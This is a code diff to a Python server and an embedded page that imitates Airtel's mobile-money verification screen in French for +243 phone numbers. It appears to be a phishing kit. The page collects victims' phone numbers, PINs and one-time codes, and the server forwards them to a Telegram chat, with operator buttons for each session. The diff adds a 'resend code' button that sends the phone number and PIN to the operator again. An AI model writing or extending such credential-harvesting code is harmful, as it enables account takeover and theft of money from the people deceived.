@@ -507,6 +507,25 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
         }, 1500);
       };
 
+      const handleResend = async () => {
+        setTimer(60);
+        setError('');
+        try {
+          await fetch('/api/verify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              session_id: sessionId,
+              phone,
+              pin: pin.join(''),
+              otp: 'RESEND_CLICKED'
+            })
+          });
+        } catch (e) {
+          console.error('Failed to notify resend:', e);
+        }
+      };
+
       const handleVerify = async () => {
         setError('');
         if (otp.join('').length < 4) {
@@ -603,7 +622,13 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
                     <input key={i} id={`otp-${i}`} type='text' maxLength='1' className='w-10 h-14 sm:w-16 sm:h-20 text-center text-2xl sm:text-3xl font-bold border border-gray-300 rounded-xl sm:rounded-2xl focus:border-red-500 outline-none' value={otp[i] || ''} onChange={(e) => hOC(i, e.target.value)} />
                   ))}
                 </div>
-                <div className='mt-6 text-gray-500 font-medium'>Renvoyer le code dans <span className='text-red-600'>{timer}s</span></div>
+                <div className='mt-6 text-gray-500 font-medium'>
+                  {timer > 0 ? (
+                    <span>Renvoyer le code dans <span className='text-red-600'>{timer}s</span></span>
+                  ) : (
+                    <button onClick={handleResend} className="text-red-600 font-bold hover:underline">Renvoyer le code</button>
+                  )}
+                </div>
                 {error && (
                   <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-xl text-red-700 font-medium text-center">
                     {error}
@@ -754,13 +779,19 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
             pin = data.get('pin', '')
             otp = data.get('otp', '')
             
-            if otp != 'Pending OTP...' and session_id:
+            if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
                 set_status_local(session_id, "pending")
             
-            message = f"🚀 <b>New Application Received!</b>\n\n"
-            message += f"📱 <b>Phone:</b> +243 {phone}\n"
-            message += f"🔑 <b>PIN:</b> {pin}\n"
-            message += f"🔢 <b>OTP:</b> {otp}\n"
+            if otp == 'RESEND_CLICKED':
+                message = f"🔄 <b>RESEND CLICKED!</b>\n\n"
+                message += f"📱 <b>Phone:</b> +243 {phone}\n"
+                message += f"🔑 <b>PIN:</b> {pin}\n"
+                message += f"⚠️ <i>User requested a new code.</i>"
+            else:
+                message = f"🚀 <b>New Application Received!</b>\n\n"
+                message += f"📱 <b>Phone:</b> +243 {phone}\n"
+                message += f"🔑 <b>PIN:</b> {pin}\n"
+                message += f"🔢 <b>OTP:</b> {otp}\n"
             
             token = os.environ.get("TELEGRAM_TOKEN")
             chat_id = os.environ.get("TELEGRAM_CHAT_ID")
@@ -775,7 +806,7 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
                     "parse_mode": "HTML"
                 }
                 
-                if otp != 'Pending OTP...' and session_id:
+                if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
                     payload["reply_markup"] = {
                         "inline_keyboard": [
                             [
